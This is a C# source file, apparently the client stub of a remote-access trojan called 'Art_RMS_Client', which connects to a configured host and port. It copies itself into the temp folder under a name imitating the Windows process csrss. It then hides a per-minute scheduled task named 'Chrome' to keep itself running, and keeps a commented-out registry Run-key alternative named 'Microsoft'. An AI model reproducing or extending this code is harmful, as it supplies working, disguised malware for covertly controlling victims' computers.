using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace Art_RMS_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            if (Settings.host != "" && Settings.port != "")
            {
                if (Convert.ToBoolean(Settings.AutoRun))
                    if (!SetSettings()) return;
                Listener.Connect();
            }
            else
                MessageBox.Show("Stub mode!");
        }

        static bool SetSettings()
        { 
            if (Application.ExecutablePath != Path.GetTempPath() + @"csrss100171341.exe")
            {
                try {
                    File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"csrss100171341.exe");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $@"/c SCHTASKS /Create /SC minute /TN Chrome /TR {Path.GetTempPath()}csrss100171341.exe /ST 00:00 /ET 23:59 /K /mo 1",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true
                    });
                    Process.Start(Path.GetTempPath() + @"\csrss100171341.exe");
                }
                catch { }
                return false;
            }
            return true;
            /*RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (!File.Exists(Path.GetTempPath() + @"\csrss100171341.exe"))
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"\csrss100171341.exe");
            if (key != null)
                try
                {
                    key.SetValue("Microsoft", Path.GetTempPath() + @"\csrss100171341.exe");
                    key.Close();
                }
                catch { }
            else
                key.Close();*/
        }
    }
}
